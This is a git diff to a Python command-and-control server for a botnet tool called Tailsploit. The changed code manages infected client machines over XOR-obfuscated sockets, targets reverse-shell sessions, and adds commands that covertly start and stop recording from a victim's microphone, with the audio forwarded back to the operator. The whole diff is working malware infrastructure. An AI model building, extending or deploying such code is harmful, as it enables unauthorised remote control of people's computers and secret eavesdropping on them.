@@ -10,6 +10,7 @@ import json
 import requests
 import psutil
 import datetime
+import select
 
 # Get the absolute path of the directory containing the script
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -86,7 +87,6 @@ class ServerShell:
         self.PORT_IP =  5050
         self.clients = {}
         self.admins = {}  
-        self.admin_socket = None
         self.DEFAULT_KEY_LENGTH = 64
         self.TARGET_CLIENT = None
         self.disconnected_clients = set()
@@ -94,6 +94,8 @@ class ServerShell:
         self.TAILSPLOIT_LOG_WEBOOK = False
         self.TailsploitCommandHandler = {}
         self.UserPermission = ""
+        self.clients_lock = threading.Lock()
+
 
     def handleXOREncryption(self, content_data, key_traffic):
         key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
@@ -152,15 +154,13 @@ class ServerShell:
         return process_cpu_percent
     
     @StaticMethodCommandHandler("target", is_available=True, exact_match=False, min_rank=2)
-    def handleTargetCommand(self, admin_socket, *args):
-        if len(args) != 3:
+    def handleTargetCommand(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if len(args) < 1:
                 InvalidFormat = f"[{Fore.RED}-{Style.RESET_ALL}] Invalid parameters. Please use 'target  <IP>:<PORT>'."
                 InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(InvalidFormatXOR)
                 return
-
-        FormattingArgsAddr = f"{args[1]}:{args[2]}"
-
+        FormattingArgsAddr = f"{args[0]}"
         try:
             client_ip, client_port = FormattingArgsAddr.split(":")
             client_port = int(client_port)
@@ -169,15 +169,95 @@ class ServerShell:
             if client_addr in self.clients:
                 self.TARGET_CLIENT = client_addr
                 FlagReverseShellConnected = f"{client_ip}:{client_port} --FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?CONNECTED"
-                FlagReverseShellConnectedXOR = self.handleXOREncryption(FlagReverseShellConnected.encode("utf.8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                FlagReverseShellConnectedXOR = self.handleXOREncryption(FlagReverseShellConnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(FlagReverseShellConnectedXOR)
+                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} (Reverse TCP) Administrator \x1B[4m{admin_username}\x1B[0m Targeting → {Fore.YELLOW}{client_ip}:{client_port}{Style.RESET_ALL}")
+
             else:
                 print(f"[{Fore.RED}-{Style.RESET_ALL}] Client not found.")
                 FlagReverseShellNotFound = f"--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND"
                 FlagReverseShellNotFoundXOR = self.handleXOREncryption(FlagReverseShellNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(FlagReverseShellNotFoundXOR)
         except: 
+            print("ERRORORORORORO")
             admin_socket.send("An error occured please try again".encode("utf-8"))
+
+    @StaticMethodCommandHandler("listen", is_available=True, exact_match=False, min_rank=2)
+    def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
+            target_ip, target_port = args[1].split(":")
+            target_client_addr = (target_ip, int(target_port))
+            target_socket = self.clients.get(target_client_addr)
+            if target_socket:
+                thread_target = "LISTENING_MICROPHONE"
+                try:
+                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    target_socket.send(TargetXOR)
+                    PrepareThread = "--FLAG_AUDIO_STREAMING_STARTED"
+                    PrepareThreadXOR = self.handleXOREncryption(PrepareThread.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(PrepareThreadXOR)
+                except Exception as e:
+                    ErrorPing = f"[-] Error, user may be disconnected"
+                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(ErrorPingXOR)
+            else:
+                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
+                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                admin_socket.send(UserDisconnectedXOR)
+        else:
+            HandleExcept = f"  : {args[0]}"
+            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(HandleExceptXOR)
+
+
+    @StaticMethodCommandHandler("stoplisten", is_available=True, exact_match=False, min_rank=2)
+    def TailsploitListenTargetMicrophone(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
+            target_ip, target_port = args[1].split(":")
+            target_client_addr = (target_ip, int(target_port))
+            target_socket = self.clients.get(target_client_addr)
+            if target_socket:
+                thread_target = "STOP_MICROPHONE"
+                try:
+                    TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    target_socket.send(TargetXOR)
+                    StopThreadListen = "--FLAG_AUDIO_STREAMING_STOPPED"
+                    StopThreadListenXOR = self.handleXOREncryption(StopThreadListen.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(StopThreadListenXOR)
+                except Exception as e:
+                    ErrorPing = f"[-] Error, user may be disconnected"
+                    ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(ErrorPingXOR)
+            else:
+                UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
+                UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                admin_socket.send(UserDisconnectedXOR)
+        else:
+            HandleExcept = f"  : {args[0]}"
+            HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(HandleExceptXOR)
+    
+
+    @StaticMethodCommandHandler("killsession", is_available=True, exact_match=False, min_rank=2)
+    def TailsploitKillCurrentSessionTCP(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        try:
+            if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
+                try:
+                    KillingSession = "--FLAG_KILL_SESSION_REVERSE_TCP_SUCCESS"
+                    KillingSessionXOR = self.handleXOREncryption(KillingSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(KillingSessionXOR)
+                except Exception as e:
+                    ErrorClosingSession = f"{Fore.RED}[-]{Style.RESET_ALL} An error occured while trying to close the current session."
+                    ErrorClosingSessionXOR = self.handleXOREncryption(ErrorClosingSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(ErrorClosingSessionXOR)
+            else:
+                WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to kill it."
+                WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                admin_socket.send(WarningSessionXOR)
+        except:
+            WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a \x1B[4mReverse TCP Session\x1B[0m in order to kill it."
+            WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            admin_socket.send(WarningSessionXOR)
 
     def handle_admin(self, admin_socket, admin_addr, admin_username):
         while True:
@@ -186,7 +266,7 @@ class ServerShell:
                 handleAdminShellCommands = self.handleXOREncryption(defaultXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                 print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Command From Administrator \x1B[4m{admin_username}\x1B[0m : {handleAdminShellCommands}")
 
-                TailsploitDiscordCommand(admin_username, handleAdminShellCommands)
+                #TailsploitDiscordCommand(admin_username, handleAdminShellCommands)
 
                 AdminShellSplitCommand = handleAdminShellCommands.split()
                 self.admin_socket = admin_socket
@@ -205,6 +285,22 @@ class ServerShell:
                     CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                 elif handleAdminShellCommands.startswith("generate-token"):
                     SetCustomMethod = "generate-token"
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("ping"):
+                    SetCustomMethod = "ping" 
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("listen"):
+                    SetCustomMethod = "listen" 
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("stoplisten"):
+                    SetCustomMethod = "stoplisten" 
+                    CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
+                    CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
+                elif handleAdminShellCommands.startswith("killsession"):
+                    SetCustomMethod = "killsession"
                     CommandCustomFunction = TailsploitCommandHandling.get(SetCustomMethod)
                     CommandCustomFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                 else:
@@ -270,31 +366,31 @@ class ServerShell:
         BotListXOR = self.handleXOREncryption(NewFormatZombies.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(BotListXOR)
 
-    @StaticMethodCommandHandler("ping", exact_match=True, is_available=True, min_rank=1)
-    def PingReverseShellTarget(self, admin_socket, admin_username, string_command, *args):
-        if "--FLAG_REVERSE_SHELL_INFO" in string_command:
-            target_info = string_command.split("--FLAG_REVERSE_SHELL_INFO")[1].strip()
-            target_ip, target_port = target_info.split(":")
-            print(f"[*] (Reverse TCP) Administrator {admin_username} Targeting: {target_ip}:{target_port} ")
+    @StaticMethodCommandHandler("ping", exact_match=False, is_available=True, min_rank=1)
+    def PingReverseShellTarget(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        if "--FLAG_REVERSE_SHELL_INFO" in args[0]:
+            target_ip, target_port = args[1].split(":")
             target_client_addr = (target_ip, int(target_port))
             target_socket = self.clients.get(target_client_addr)
             if target_socket:
                 thread_target = "REVERSE_SHELL_THREAD=ISALIVE?"
                 try:
                     TargetXOR = self.handleXOREncryption(thread_target.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    print("Sending to target...")
                     target_socket.send(TargetXOR)
-                    print(f"[*] Sent ping to : {target_ip}:{target_port}")
+                    print("Sended !")
                 except Exception as e:
-                    print(f"Error sending 'hello' to target {target_ip}:{target_port}: {e}")
                     ErrorPing = f"[-] Error, user may be disconnected"
                     ErrorPingXOR = self.handleXOREncryption(ErrorPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                     admin_socket.send(ErrorPingXOR)
             else:
+                print("EXEC")
                 UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                 UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(UserDisconnectedXOR)
+                admin_socket.send("ERRUR".encode())
         else:
-            HandleExcept = f"  : {string_command}"
+            HandleExcept = f"  : {args[0]}"
             HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(HandleExceptXOR)
 
@@ -571,41 +667,60 @@ For more information, see the JSON file located at:
                 AdminNotFoundXOR = self.handleXOREncryption(AdminNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(AdminNotFoundXOR)
 
-    def send_hello_to_clients(self, admin_socket):
-        if len(self.clients) <= 0:
-            admin_socket.send(f"0 Clients are connected".encode("utf-8"))
-        else:
-            for addr, client_socket in self.clients.items():
-                client_socket.send("Hello".encode("utf-8"))
 
-            print(f"Sent to {len(self.clients)}")
-
-    def receive_data_from_clients(self):
+    def TailsploitTrafficCommunicationData(self):
         while True:
-            for addr, client_socket in list(self.clients.items()):
-                try:
-                    data = client_socket.recv(4096).decode("utf-8")
-                    if data:
-                        print(f"Data from client {addr}: {data}")
-                        if data == "REVERSE_SHELL_THREAD=ISALIVE?TRUE":
-                            time.sleep(0.1)
-                            if self.admin_socket:
-                                isAlive = f"[{Fore.GREEN}*{Style.RESET_ALL}] Reverse Shell target is alive"
-                                isAliveXOR = self.handleXOREncryption(isAlive.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
-                                self.admin_socket.send(isAliveXOR)
-                        else:
-                            time.sleep(0.1)
-                            if self.admin_socket:
-                                SendingDataXOR = self.handleXOREncryption(data.encode("utf-8"))
-                                self.admin_socket.send(SendingDataXOR)
+            try:
+                if not self.clients:
+                    continue  # No clients, continue to the next iteration
 
-                except ConnectionResetError:
-                    if addr not in self.disconnected_clients:  
-                        self.disconnected_clients.add(addr)
-                        print(f"Client {addr} disconnected")
+                readable, _, _ = select.select(list(self.clients.values()), [], [], 1)
+                
+                for client_socket in readable:
+                    try:
+                        data = client_socket.recv(4096)
+                        if data:
+                            self.IncomingDataSocket(client_socket, data)
+                    except UnicodeDecodeError:
+                        pass
+                    except ConnectionResetError:
+                        self.HandleClientDisconnect(client_socket)
+                            
+            except Exception as e:
+                print("ERROR: ", e)
 
-                    del self.clients[addr]
-                    break
+
+    def IncomingDataSocket(self, client_socket, data):
+        if data.startswith(b"AUD:"):
+            self.ForwardToAdminSocket(data)
+        else:
+            decoded_data = data.decode("utf-8")
+            self.process_data(client_socket, decoded_data)
+
+    def HandleClientDisconnect(self, client_socket):
+        with self.clients_lock:
+            for client_addr, socket in self.clients.items():
+                if socket == client_socket:
+                    del self.clients[client_addr]
+                    if client_addr not in self.disconnected_clients:
+                        self.disconnected_clients.add(client_addr)
+                        print(f"{Fore.RED}[-]{Style.RESET_ALL} Client {Fore.YELLOW}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL} Disconnected from the botnet")
+
+    def ForwardToAdminSocket(self, data):
+        if self.admin_socket:
+            self.admin_socket.send(data)
+
+    def process_data(self, client_socket, decoded_data):
+        if decoded_data == "REVERSE_SHELL_THREAD=ISALIVE?TRUE":
+            try:
+                isAlive = f"[{Fore.GREEN}*{Style.RESET_ALL}] Reverse Shell target is alive"
+                isAliveXOR = self.handleXOREncryption(isAlive.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                self.admin_socket.send(isAliveXOR)
+            except Exception as e:
+                print(e)
+        else:
+            SendingDataXOR = self.handleXOREncryption(decoded_data.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+            self.admin_socket.send(SendingDataXOR)
 
     def ConfigurationTailsploitServer(self):
         WebhookPrimaryIndex = None
@@ -646,7 +761,7 @@ For more information, see the JSON file located at:
                 if WebhookPrimaryIndex and WebhookSecondaryIndex:
                     time.sleep(1)
                     os.system("cls")
-                    self.start_server()
+                    self.InitializingTailsploitServer()
                     break
 
             elif TailsploitWebhook == "n":
@@ -659,7 +774,7 @@ For more information, see the JSON file located at:
                 continue
         
 
-    def start_server(self):
+    def InitializingTailsploitServer(self):
         start_time = time.time()  # Record the start time
 
         print(f"[{Fore.GREEN}*{Style.RESET_ALL}] Setting up Tailsploit Server...")
@@ -714,15 +829,16 @@ For more information, see the JSON file located at:
 \x1B[4mTailsploit Server Log\x1B[0m >
 """)
 
-        data_thread = threading.Thread(target=self.receive_data_from_clients, name="Traffic Communication Data Handler [Tailsploit Server (XOR)]")
+        data_thread = threading.Thread(target=self.TailsploitTrafficCommunicationData, name="Traffic Communication Data Handler [Tailsploit Server (XOR)]")
         data_thread.start()
 
         while True:
             client_socket, client_addr = server_socket.accept()
+
             #print(f"[+] Accepted connection from: {client_addr}")
 
             self.handle_client(client_socket, client_addr)
 
 if __name__ == "__main__":
     x = ServerShell()
-    x.start_server()
+    x.InitializingTailsploitServer()
